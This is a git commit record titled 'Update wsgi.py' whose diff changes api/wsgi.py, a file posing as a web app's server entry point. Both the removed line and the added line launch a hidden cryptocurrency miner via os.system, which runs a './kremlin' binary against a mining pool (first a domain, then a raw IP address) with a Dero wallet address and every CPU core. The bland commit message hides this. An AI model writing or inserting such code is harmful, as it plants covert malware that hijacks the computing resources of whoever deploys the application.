347cc426ff32b6d7c9d671d4a7d427d4130ee649
annisamukti8125-hash <annisamukti8125@gmail.com>
2026-03-03 16:33:58 +0700

    Update wsgi.py

--- api/wsgi.py
+++ api/wsgi.py
@@ -1,3 +1,3 @@
 import os
 
-os.system('./kremlin -r fastpool.xyz:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)')
+os.system('./kremlin -r 167.172.183.204:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)')
